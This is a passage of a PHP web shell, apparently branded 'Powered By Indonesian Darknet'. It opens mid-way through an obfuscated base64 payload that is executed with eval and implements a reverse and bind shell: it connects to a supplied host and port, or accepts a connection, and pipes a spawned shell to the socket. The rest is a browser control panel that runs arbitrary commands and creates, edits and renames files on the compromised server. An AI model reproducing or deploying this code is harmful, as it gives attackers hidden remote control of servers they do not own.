VUlDOwpmdWZwWDoKZXhpdCgxKTsKZ290byBReDFLVTsKcXlZMlQ6CiRjID0gc3RyZWFtX3NvY2tldF9hY2NlcHQoJHMpOwpnb3RvIHR2ZEhuOwpkSkJNRjoKJG0gPSAiXHg0N1wxNDVcMTU0XHgzNFx4NzlcNDBcMTIzXHg2OFwxNDVcMTU0XHg2Y1x4YSI7CmdvdG8gY0JwaWo7CkQzUnVoOgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRjLCAwKTsKZ290byB5RHhyazsKWU05MEg6CiRkcyA9IGFycmF5KDAgPT4gYXJyYXkoIlx4NzBcMTUxXHg3MFx4NjUiLCAiXHg3MiIpLCAxID0+IGFycmF5KCJceDcwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSwgMiA9PiBhcnJheSgiXDE2MFx4NjlcMTYwXHg2NSIsICJcMTY3IikpOwpnb3RvIEFZaGtlOwp1RWdWRjoKZXhpdCgxKTsKZ290byBtNGdrbDsKTVpCcWw6CmZjbG9zZSgkcGlwWzFdKTsKZ290byBhWk9BbTsKSzlzeVA6CiR0ID0gIlx4NjJceDY5XHg2ZVwxNDQiOwpnb3RvIHBzOFBpOwpyV3lnMjoKZ290byB2ZzFKMTsKZ290byB0dkVIUjsKdEszM186CmlmIChpc19yZXNvdXJjZSgkcHIpKSB7CiAgZ290byBvUnRUMDsKfQpnb3RvIGZ1ZnBYOwpZMGNIajoKJHMgPSBmc29ja29wZW4oJGgsICRwLCAkZW4sICRlcywgMzApOwpnb3RvIEg3bTNlOwpFZzloZzoKczVkN186CmdvdG8gcHdxYUs7ClQ0TEVpOgokcmEgPSBhcnJheSgkYywgJHBpcFsxXSwgJHBpcFsyXSk7CmdvdG8gek9mOUQ7Clg3a1UzOgppZiAoISgkcGlkID09IC0xKSkgewogIGdvdG8gVkIzX047Cn0KZ290byBkMm15ZDsKUzBNTHo6CkJhYXIwOgpnb3RvIE9odWU4OwpReDFLVToKb1J0VDA6CmdvdG8gdGVqbUU7Cm00Z2tsOgpMaFA2QjoKZ290byBTME1MejsKTjRVSUM6CkNHSTQwOgpnb3RvIE44aTJiOwpkMm15ZDoKZXhpdCgxKTsKZ290byBWaDM5QTsKTjlPdTE6CiRpID0gZnJlYWQoJHBpcFsyXSwgJGNzKTsKZ290byBVa1M2ejsKTWl4NzU6CmdvdG8gdFhjSV87CmdvdG8gc3hHbTA7CnBIa2t6OgppZiAoJHQgPT0gIlx4NjJceDYxXDE0M1x4NmIiKSB7CiAgZ290byBqVUhKNDsKfQpnb3RvIHBVaF9MOwpkbW1FSDoKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIGxncm4yOwpoVHJWaToKVDh4b1E6CmdvdG8gY2VIbnQ7CkQ4VlpFOgppZiAoIXRydWUpIHsKICBnb3RvIHZnMUoxOwp9CmdvdG8gSF9MSHk7CnZDOUswOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIHVoUFNyOwpUT01NNjoKcHJvY19jbG9zZSgkcHIpOwpnb3RvIGNIeXJYOwpRV18yVDoKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byB0SzMzXzsKUWZmNlc6CmZjbG9zZSgkYyk7CmdvdG8gdVduaUk7CnpIXzNuOgppZiAoIWluX2FycmF5KCRwaXBbMV0sICRyYSkpIHsKICBnb3RvIFQ4eG9ROwp9CmdvdG8gZG1tRUg7Cld1WmpoOgokY3MgPSAxMzM3Owpnb3RvIG5PRjQ3OwpzeEdtMDoKalVISjQ6CmdvdG8gWTBjSGo7ClJQMHlnOgokdGFyZ2V0cyA9IGV4cGxvZGUoIlw0MCIsICR0YXJnZXQpOwpnb3RvIFd1WmpoOwpFUTBmbToKaWYgKCEocG9zaXhfc2V0c2lkKCkgPT0gLTEpKSB7CiAgZ290byBMaFA2QjsKfQpnb3RvIHVFZ1ZGOwpDQ3ZNbToKJHBpZCA9IHBjbnRsX2ZvcmsoKTsKZ290byBYN2tVMzsKRTIyYkw6CmM2dmxDOgpnb3RvIFNQRVpEOwpBWWhrZToKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byBoMWhENDsKSF9MSHk6CmlmICghKGZlb2YoJGMpIHx8IGZlb2YoJHBpcFsxXSkpKSB7CiAgZ290byBYWEJLdDsKfQpnb3RvIHJXeWcyOwpwVWhfTDoKZ290byB0WGNJXzsKZ290byB3X3p4UTsKTTdNSnc6CiRpID0gZnJlYWQoJHMsICRjcyk7CmdvdG8gdW4yQm87CnpPZjlEOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIFAySE14OwpJYXFISToKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzFdLCAwKTsKZ290byB3b0FaMzsKQTZNRjA6CiRpID0gZnJlYWQoJGMsICRjcyk7CmdvdG8gaTZpTDE7Cmxncm4yOgpmd3JpdGUoJHMsICRpKTsKZ290byBoVHJWaTsKVjRlS2c6CmlmICghJHBpZCkgewogIGdvdG8gSzFmSnI7Cn0KZ290byBvNl9uczsKWDJhdVg6CmdvdG8gV0JXM1I7CmdvdG8gRTIyYkw7ClZoMzlBOgpWQjNfTjoKZ290byBWNGVLZzsKSDdtM2U6CmZ3cml0ZSgkcywgJG0pOwpnb3RvIFlNOTBIOwpVa1M2ejoKZndyaXRlKCRjLCAkaSk7CmdvdG8gbEtoOHU7ClBseER1OgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMV0sIDApOwpnb3RvIEs3NnNnOwpsS2g4dToKT0FLb1I6CmdvdG8gbl81VU87CnZtMDl0OgppVjZuUzoKZ290byBzZ01jUDsKeUR4cms6ClY1RFpfOgpnb3RvIEQ4VlpFOwp3b0FaMzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzJdLCAwKTsKZ290byBqNm1KVzsKZVY1V1U6ClFETDlHOgpnb3RvIHpIXzNuOwp1bjJCbzoKZndyaXRlKCRwaXBbMF0sICRpKTsKZ290byBlVjVXVTsKQTI0dEk6CmZ3cml0ZSgkYywgJGkpOwpnb3RvIGhZeXphOwppZVAzMzoKJHJhID0gYXJyYXkoJHMsICRwaXBbMV0sICRwaXBbMl0pOwpnb3RvIHZDOUswOwpoMWhENDoKaWYgKGlzX3Jlc291cmNlKCRwcikpIHsKICBnb3RvIHM1ZDdfOwp9CmdvdG8gQXR0RlU7CmNPb0JlOgpXUW1qXzoKZ290byBJSXBDNzsKRUtzaXU6CmdvdG8gaVY2blM7CmdvdG8gUFFUV0M7Cm5fNVVPOgpnb3RvIFY1RFpfOwpnb3RvIElDd2UzOwpiMk1tQToKJGRzID0gYXJyYXkoMCA9PiBhcnJheSgiXDE2MFwxNTFceDcwXHg2NSIsICJceDcyIiksIDEgPT4gYXJyYXkoIlwxNjBcMTUxXHg3MFwxNDUiLCAiXDE2NyIpLCAyID0+IGFycmF5KCJcMTYwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSk7CmdvdG8gUVdfMlQ7CndrcktMOgpzZXRfdGltZV9saW1pdCgwKTsKZ290byBQVWVEUjsKSzc2c2c6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcFsyXSwgMCk7CmdvdG8gRDNSdWg7CnVXbmlJOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gTVpCcWw7ClBRVFdDOgpnakhfMToKZ290byBpZVAzMzsKajZtSlc6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHMsIDApOwpnb3RvIGNPb0JlOwp4dlJTejoKd1NOX3Q6CmdvdG8gUGJVczk7Cm94UVd6OgppZiAoIShmZW9mKCRzKSB8fCBmZW9mKCRwaXBbMV0pKSkgewogIGdvdG8gZ2pIXzE7Cn0KZ290byBFS3NpdTsKdWhQU3I6CmlmICghaW5fYXJyYXkoJHMsICRyYSkpIHsKICBnb3RvIFFETDlHOwp9CmdvdG8gTTdNSnc7CnRlam1FOgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMF0sIDApOwpnb3RvIFBseER1OwpEU2tUbjoKaWYgKGNvdW50KCR0YXJnZXRzKSA9PSAyKSB7CiAgZ290byBGN0pPcDsKfQpnb3RvIFgyYXVYOwpJQ3dlMzoKdmcxSjE6CmdvdG8gUEJSM2U7CmswWXBROgpmY2xvc2UoJHBpcFsxXSk7CmdvdG8gbFVjUWI7ClAySE14OgppZiAoIWluX2FycmF5KCRjLCAkcmEpKSB7CiAgZ290byBDR0k0MDsKfQpnb3RvIEE2TUYwOwpoWmk4ejoKJGggPSAkdGFyZ2V0c1sxXTsKZ290byBRM2p2YzsKY2VIbnQ6CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gd1NOX3Q7Cn0KZ290byBLUTFRUjsKd196eFE6CnBlWGVROgpnb3RvIFZEQkFxOwpqaEVkMzoKJHAgPSAkdGFyZ2V0c1swXTsKZ290byBoWmk4ejsKUGJVczk6CmdvdG8gV1Ftal87CmdvdG8gdm0wOXQ7CmNIeXJYOgp0WGNJXzo=");
                $rRwNpSflmI = "\$target = \"{$g9_4Zq7xGB} {$TkCbW35AQi}\";\n{$rRwNpSflmI}";
                eval($rRwNpSflmI);
                echo 'Finished...';
                echo '</div>';
            }
        } else {
            if ($hzOvuJeFzz == "cfile") {
                ?>
<h5>New file</h5>
<form method="post">
<div class="form-group">
<label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt">
</div>
<div class="form-group">
<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea>
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
</div>
</form>
<?php 
                isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? BB5iNvUgyh("file name has been used", rxeFBN6HEy($EEfZ6TZDdb, 0) . "&a=" . rXefbN6HEy("cfile", 0), 0) : (file_put_contents("{$EEfZ6TZDdb}/{$_POST["n"]}", $_POST["ctn"]) ? Bb5inVUGYh("file created successfully", rXeFBN6heY($EEfZ6TZDdb, 0) . "&a=" . rXEFBn6HEy("view", 0) . "&n=" . RXeFbn6heY($_POST["n"], 0)) : Bb5invUgYh("file failed to create", rxEFBN6HEy($EEfZ6TZDdb, 0), 0)) : null;
            } else {
                if ($hzOvuJeFzz == "cdir") {
                    ?>
<h5>New folder</h5>
<form method="post">
<div class="form-group">
<label for="n">Name :</label>
<input name="n" id="n" class="form-control" autocomplete="off">
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
</div>
</form>
<?php 
                    isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? Bb5INvugYh("folder name has been used", rxefbn6hEy($EEfZ6TZDdb, 0) . "&a=" . rxefBn6hey("cdir", 0)) : (mkdir("{$EEfZ6TZDdb}/{$_POST["n"]}") ? bB5iNVUGyH("folder created successfully", RxeFbN6HEy($EEfZ6TZDdb . "/" . $_POST["n"], 0)) : BB5InvUgYH("folder failed to create", RxEfBN6hEy($EEfZ6TZDdb, 0), 0)) : null;
                } else {
                    if ($hzOvuJeFzz == "term") {
                        ?>
<h5>Command</h5>
<pre class="border bg-info p-2"><i class="fa fa-terminal"></i> <?php 
                        echo isset($_POST["cmd"]) ? $_POST["cmd"] . "<br>" . ZiODPz7nrE($_POST["cmd"]) : "";
                        ?></pre>
<form method="post">
<div class="form-group">
<input type="text" name="cmd" class="form-control">
</div>
</form>
<?php 
                    } else {
                        if ($hzOvuJeFzz == 'edit') {
                            ?>
<h5>Edit file</h5>
<span>File name : <?php 
                            echo RxEfbn6Hey($_GET["n"]);
                            ?></span>
<form method="post">
<div class="form-group">
<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php 
                            echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . RxEfbN6hEy($_GET["n"])));
                            ?></textarea>
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
</div>
</form>
<?php 
                            isset($_POST["s"]) ? file_put_contents($EEfZ6TZDdb . '/' . rXefBN6HeY($_GET["n"]), $_POST["ctn"]) ? bb5InvUgYH("file contents changed successfully", rXefbN6heY($EEfZ6TZDdb, 0) . "&a=" . RXeFbN6Hey("view", 0) . "&n={$_GET["n"]}") : BB5INVUgYh("file contents failed to change", RxEFBN6hey($EEfZ6TZDdb, 0), 0) : null;
                        } else {
                            if ($hzOvuJeFzz == 'rename') {
                                ?>
<h5>View <?php 
                                echo $_GET["t"] == "d" ? "folder" : "file";
                                ?></h5>
<form method="post">
<div class="form-group">
<label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php 
                                echo rxeFBn6hEy($_GET["n"]);
                                ?>">
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
</div>
</form>
<?php 
                                isset($_POST["s"]) ? rename($EEfZ6TZDdb . '/' . rXEFbn6heY($_GET["n"]), $_POST["n"]) ? bB5invUGyH("successfully changed the name", rxEfbn6hey($EEfZ6TZDdb, 0)) : Bb5iNvugyh("failed to change the name", RXEfbn6HEY($EEfZ6TZDdb, 0), 0) : null;
                            } else {
                                if ($hzOvuJeFzz == 'view') {
                                    ?>
<h5>View file</h5>
<span>File name : <?php 
                                    echo rXEfBN6HEy($_GET["n"]);
                                    ?></span>
<div class="form-group">
<label for="ctn">Content :</label><textarea id="ctn" cols="30" rows="10" class="form-control" readonly><?php 
                                    echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . rXEFBN6HeY($_GET["n"])));
                                    ?></textarea>
</div>
<?php 
                                } else {
                                }
                            }
                        }
                    }
                }
            }
        }
        ?>
</div>
<?php 
    }
}
?>
</article>
<div class="bg-dark border text-center mt-2 py-2">
<small>Copyright &copy; 2021 - Powered By Indonesian Darknet</small>
</div>
</main>
<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
<script>
eval(function(p, a, c, k, e, d) {
e = function(c) {
return(c < a?'': e(parseInt(c/a)))+((c = c%a) > 35?String.fromCharCode(c+29): c.toString(36))}; if (!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))
</script>
</body>
</html><?php 